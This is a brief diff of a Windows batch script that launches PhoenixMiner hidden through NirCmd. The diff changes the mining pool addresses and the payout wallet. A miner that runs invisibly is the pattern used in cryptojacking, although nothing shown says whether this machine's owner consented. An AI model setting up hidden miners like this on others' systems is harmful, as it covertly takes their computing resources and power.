@@ -10,4 +10,4 @@ setx GPU_MAX_ALLOC_PERCENT 100 >nul
 setx GPU_SINGLE_ALLOC_PERCENT 100 >nul
 
 
-start "" /B cmd /C "%NIRCMD_PATH% exec hide %PHOENIX_MINER_PATH% -pool ssl://etc-us-east.flexpool.io:5555 -pool2 ssl://etc-de.flexpool.io:5555 -wal 0x2Bd0aD57189df2e8d28f69994e5d1Db3858CD96A.worker"
+start "" /B cmd /C "%NIRCMD_PATH% exec hide %PHOENIX_MINER_PATH% -pool stratum+tcp://ethw.poolbinance.com:1800 -pool2 stratum+tcp://ethw.poolbinance.com:25 -wal 0x52505806210Bdc3FCf3A6c763165A73a30A05F77.worker"
